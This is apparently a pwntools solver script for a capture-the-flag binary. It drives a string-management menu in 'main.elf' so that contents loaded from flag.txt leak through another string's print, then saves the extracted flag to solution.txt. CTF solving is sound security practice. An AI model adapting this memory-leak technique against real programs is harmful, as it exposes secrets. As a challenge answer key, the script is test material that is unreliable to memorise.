#!/usr/bin/env python3
from pwn import *
import re
flag_regex = re.compile("(InfoSec{.+[^}]})")
flag = ""

e = ELF("./main.elf")
main_addr = e.symbols["main"]

p = process("./main.elf")

p.sendline(hex(main_addr))

p.recvuntil("0: Create new regular string")
p.sendline("0")
p.sendline("10")

p.sendline("1: Create super secret string")
p.sendline("1")
p.sendline("10")

p.sendline("3: Fill secret string")
p.sendline("1")
p.sendline("flag.txt")

p.sendline("0: Create new regular string")
p.sendline("0")
p.sendline("100")

p.sendline("5: Print Content")
p.sendline("0")

received = str(p.recvall(1).decode())
flag = re.findall(flag_regex, received)[0]

#Print the flag
print(flag)
#Write the flag to the solution file
solution = open("solution.txt", "w")
solution.write(flag)
solution.close()